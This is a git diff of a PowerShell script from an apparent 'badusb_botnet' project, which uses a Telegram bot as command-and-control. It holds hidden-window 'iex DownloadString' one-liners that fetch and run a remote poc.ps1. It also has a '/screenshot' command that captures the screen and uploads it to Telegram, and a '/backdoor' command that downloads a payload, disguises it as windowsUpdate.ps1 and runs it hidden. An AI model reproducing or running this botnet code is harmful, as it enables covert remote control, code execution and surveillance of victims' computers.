@@ -7,7 +7,7 @@ powershell.exe -windowstyle hidden -file this_file.ps1
 iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/d6961bac47986b3e047cd9468de4639b9f9a45d0/poc.ps1'))
 
 PowerShell.exe -WindowStyle Hidden -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/d6961bac47986b3e047cd9468de4639b9f9a45d0/poc.ps1'))
-PowerShell.exe -WindowStyle Minimized -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/d6961bac47986b3e047cd9468de4639b9f9a45d0/poc.ps1'))
+PowerShell.exe -WindowStyle Minimized -Command iex ((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/alexfrancow/badusb_botnet/master/poc.ps1'))
 #>
 
 ############
@@ -119,7 +119,6 @@ $PreviousLoop_LastMessageTime = $LastMessageTime_Origin
  
 $SleepStartTime = [Float] (get-date -UFormat %s) #This will be used to check if the $SleepTime has passed yet before sending a new notification out
 While ($DoNotExit)  {
- 
   Sleep -Seconds $LoopSleep
   #Reset variables that might be dirty from the previous cycle
   $LastMessageText = ""
@@ -176,43 +175,42 @@ While ($DoNotExit)  {
 		Sleep -seconds 5
 		$DoNotExit = 0
 	  }
-	  "/list"  {
-		Invoke-WebRequest `
-		-Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
-		-Method Post `
-		-ContentType "application/json;charset=utf-8" `
-		-Body (ConvertTo-Json -Compress -InputObject $payload)
-	      }
-	  "/screenshot $ipV4"{
-	      [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
-		function screenshot([Drawing.Rectangle]$bounds, $path) {
-		   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
-		   $graphics = [Drawing.Graphics]::FromImage($bmp)
+      "/list"  {
+        Invoke-WebRequest `
+        -Uri ("https://api.telegram.org/bot{0}/sendMessage" -f $BotToken) `
+        -Method Post `
+        -ContentType "application/json;charset=utf-8" `
+        -Body (ConvertTo-Json -Compress -InputObject $payload)
+      }
+      "/screenshot $ipV4"{
+      [Reflection.Assembly]::LoadWithPartialName("System.Drawing")
+        function screenshot([Drawing.Rectangle]$bounds, $path) {
+           $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
+           $graphics = [Drawing.Graphics]::FromImage($bmp)
 
-		   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+           $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
 
-		   $bmp.Save($path)
+           $bmp.Save($path)
 
-		   $graphics.Dispose()
-		   $bmp.Dispose()
-	  }
+           $graphics.Dispose()
+           $bmp.Dispose()
+        }
 
-		$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080)
-		screenshot $bounds "C:\Users\afranco\Documents\screenshot.jpg"
-		$filepath = 'C:\Users\afranco\Documents\screenshot.jpg'
-		$url = "https://api.telegram.org/bot$($BotToken)/sendPhoto?chat_id=$($ChatID)"
-		$name = "test"
-		upload($url, $filepath, $name)
-		#Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendPhoto?chat_id=$($ChatID)" -ContentType 'multipart/form-data' -Method Post -InFile $FileContent;
-
-	  }
-	  "/backdoor $ipV4"  {
-		Invoke-WebRequest -Uri https://raw.githubusercontent.com/alexfrancow/badusb_botnet/d6961bac47986b3e047cd9468de4639b9f9a45d0/poc.ps1 -OutFile C:\Users\afranco\Documents\windowsUpdate.ps1
-		$command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\afranco\Documents\windowsUpdate.ps1"
-		Invoke-Expression -Command:$command 
-		Stop-Process -Name "cmd" -Confirm -PassThru
-		# Falta añadirlo al inicio de windows
-	  }
+        $bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1920, 1080)
+        screenshot $bounds "C:\Users\afranco\Documents\screenshot.jpg"
+        $filepath = 'C:\Users\afranco\Documents\screenshot.jpg'
+        $url = "https://api.telegram.org/bot$($BotToken)/sendPhoto?chat_id=$($ChatID)"
+        $name = "test"
+        upload($url, $filepath, $name)
+        #Invoke-RestMethod -Uri "https://api.telegram.org/bot$($BotToken)/sendPhoto?chat_id=$($ChatID)" -ContentType 'multipart/form-data' -Method Post -InFile $FileContent;
+        
+      }
+      "/backdoor $ipV4"  {
+        Invoke-WebRequest -Uri https://raw.githubusercontent.com/alexfrancow/badusb_botnet/d6961bac47986b3e047cd9468de4639b9f9a45d0/poc.ps1 -OutFile C:\Users\afranco\Documents\windowsUpdate.ps1
+        $command = cmd.exe /c "powershell.exe -windowstyle hidden -file C:\Users\afranco\Documents\windowsUpdate.ps1"
+        Invoke-Expression -Command:$command 
+        # Falta añadirlo al inicio de windows
+      }
 	  default  {
 	    #The message sent is unknown
 		$Message = "Sorry $($LastMessage.Message.from.first_name), but I don't understand ""$($LastMessageText)""!"
@@ -222,3 +220,4 @@ While ($DoNotExit)  {
 	
   }
 }
+
